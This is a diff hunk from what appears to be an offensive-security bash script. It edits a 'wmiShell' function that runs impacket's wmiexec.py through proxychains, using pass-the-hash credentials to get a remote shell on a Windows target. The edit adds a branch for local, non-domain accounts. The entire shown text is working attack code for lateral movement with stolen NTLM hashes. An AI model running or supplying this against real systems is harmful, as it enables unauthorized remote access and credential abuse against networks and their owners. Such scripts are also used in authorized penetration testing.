@@ -780,10 +780,18 @@ function wmiShell(){
     # DESCRIPTION: WMI shell on target system.
     # ARGUMENT: TARGET.
     TARGET=$1;
-    proxychains \
-    wmiexec.py \
-    -no-pass -hashes $HASHES \
-    -dc-ip $DCIP ${DOMAINUSER}@${TARGET};
+    if [[ -z "$DOMAIN" ]]
+    then
+          proxychains \
+            wmiexec.py \
+            -no-pass -hashes $HASHES \
+            ${USER}@${TARGET};
+    else
+          proxychains \
+            wmiexec.py \
+            -no-pass -hashes $HASHES \
+            -dc-ip $DCIP ${DOMAINUSER}@${TARGET};
+    fi
     return;
 }
 
